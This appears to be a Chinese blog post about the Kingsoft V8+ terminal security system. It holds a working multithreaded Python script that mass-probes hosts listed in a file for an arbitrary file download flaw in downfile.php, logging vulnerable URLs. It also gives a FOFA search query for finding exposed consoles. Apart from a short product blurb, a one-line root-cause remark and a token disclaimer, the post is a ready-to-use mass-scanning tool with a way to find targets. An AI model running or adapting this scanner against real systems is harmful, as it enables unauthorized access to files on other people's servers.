**一:金山v8终端安全系统是什么？**

金山v8+终端安全系统电脑版是金山毒霸专为企业推出的安全防护杀毒软件工具，拥有超丰富强大的功能，更快速的防御病毒入侵，更好的保护电脑安全，并且还能实现多平台管理，非常好用。金山v8+终端安全系统是新一代企业终端安全软件，该产品可动态检测、实时处理、全网追溯用户网络中的未知威胁，满足国内企业用户日益复杂的含pc、移动、虚拟桌面在内的多类终端安全防护需求。

 **二:批量化探测漏洞poc代码**

    
    
    import requests
    import threading
    import queue
    def v8_test():
    	while not q.empty():
    		url=q.get()
    		header={"user-agent":""}
    		path='/htmltopdf/downfile.php?filename=downfile.php'
    		poc_url='http://'+url+path
    		print(poc_url)
    		try:
    			response=requests.get(url=poc_url,headers=header,timeout=5,verify=False)
    			if "$filename" in response.text and response.status_code==200:
    				print(poc_url+" exsit vulhub")
    				with open('poc.txt','a') as f:
    					f.write(poc_url+'\n')
    			else:
    				pass
    		except Exception as e:
    			pass
    if __name__=="__main__":
    	q=queue.Queue()
    	for ip in open('./v8.txt','r'):
    		ip=ip.strip()
    		print(ip)
    		q.put(ip)
    	for i in range(10):
    		poc=threading.Thread(target=v8_test)
    		poc.start()
    

**三.该代码的作用就是批量探测网站有没有金山v8终端安全系统任意文件下载漏洞，**

将你要探测的url放到v8.txt中，若有漏洞，或自动输出，并且存储在poc.txt文件中。  
该脚本只是为了验证该漏洞，还请各位老哥别干坏事，否则后果自负。

 **四:分析代码可以了解到漏洞出现在downfile.php,没有对用户输入的参数进行过滤，造成任意文件下载漏洞。**

 **fofa搜索title="在线安装-V8+终端安全系统Web控制台"**

